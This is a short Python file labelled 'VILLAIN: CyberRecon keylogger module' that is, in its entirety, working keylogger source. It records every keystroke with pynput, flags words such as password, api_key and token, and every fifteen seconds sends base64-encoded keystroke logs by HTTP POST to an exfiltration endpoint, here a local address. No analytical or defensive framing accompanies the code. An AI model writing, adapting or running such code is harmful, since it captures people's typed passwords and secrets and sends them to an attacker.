# VILLAIN: CyberRecon keylogger module
import threading, base64, requests
from pynput import keyboard

BUFFER = ""
C2 = "http://127.0.0.1:8443/exfil/v1c71m"
SENSITIVE = ("password", "passwd", "credential", "api_key", "secret", "token")

def on_press(key):
    global BUFFER
    try:
        BUFFER += key.char
    except AttributeError:
        BUFFER += " [ENTER] "
    low = BUFFER.lower()
    for word in SENSITIVE:
        if word in low:
            requests.post(C2, data={"cred_hit": word})

def flush_loop():
    global BUFFER
    while True:
        if BUFFER:
            blob = base64.b64encode(BUFFER.encode()).decode()
            requests.post(C2, data={"keys": blob})
            BUFFER = ""
        threading.Event().wait(15)

listener = keyboard.Listener(on_press=on_press)
listener.start()
threading.Thread(target=flush_loop, daemon=True).start()
